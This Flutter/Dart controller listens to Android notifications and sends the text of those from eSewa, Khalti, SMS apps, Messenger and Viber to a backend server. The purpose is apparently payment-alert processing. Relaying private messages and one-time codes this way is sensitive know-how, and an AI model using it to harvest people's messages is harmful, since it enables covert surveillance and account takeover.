import 'package:get/get.dart';
import 'package:notification_listener_service/notification_listener_service.dart';
import 'ApiService.dart';

class SMSController extends GetxController {
  final ApiService apiService = ApiService();

  @override
  void onInit() {
    super.onInit();
    requestForPermission(); // Check and request permission when the controller is initialized
  }

  /// Request Notification Listener Permission
  void requestForPermission() async {
    print("Checking Permission...");
    final bool status = await NotificationListenerService.isPermissionGranted();

    if (status) {
      print("Permission already granted. Starting listener...");
      listenNotification();
    } else {
      print("No permission. Requesting now...");
      final bool newStatus = await NotificationListenerService.requestPermission();

      if (newStatus) {
        print("Permission granted. Starting listener...");
        listenNotification();
      } else {
        print("Permission denied. Cannot start listener.");
      }
    }
  }

  /// Listen to Notifications
  void listenNotification() {
    print('Listening to notifications...');
    NotificationListenerService.notificationsStream.listen((event) async {
      print("Current notification: $event");

      // Safely extract the `content`, `packageName`, and `hasRemoved` fields from the notification event
      final messageContent = event?.content;
      final packageName = event?.packageName;
      final hasRemoved = event?.hasRemoved ?? false;

      print("Notification content: $messageContent");
      print("Notification package: $packageName");
      print("Notification removed: $hasRemoved");

      // Ignore notifications that are removed
      if (hasRemoved) {
        print("Notification has been removed, skipping backend call.");
        return;
      }

      // List of allowed packages
      final allowedPackages = [
        "com.f1soft.esewa", // eSewa
        "com.khalti",             // Khalti
        "com.android.messaging",  // Default SMS app
        "com.google.android.apps.messaging", // Google Messages
        "com.facebook.orca",
        "com.viber.voip"
      ];

      // Filter notifications based on the package name
      if (packageName != null && allowedPackages.contains(packageName.trim())) {
        if (messageContent != null && messageContent.isNotEmpty) {
          try {
            // Send the content to the backend
            print("Sending notification content to backend...");
            await apiService.sendMessageToBackend(messageContent);
          } catch (e) {
            print("Error while sending message to backend: $e");
          }
        } else {
          print("No content in the notification, skipping backend call.");
        }
      } else {
        print("Notification is not from an allowed package, skipping backend call.");
      }
    });
  }
}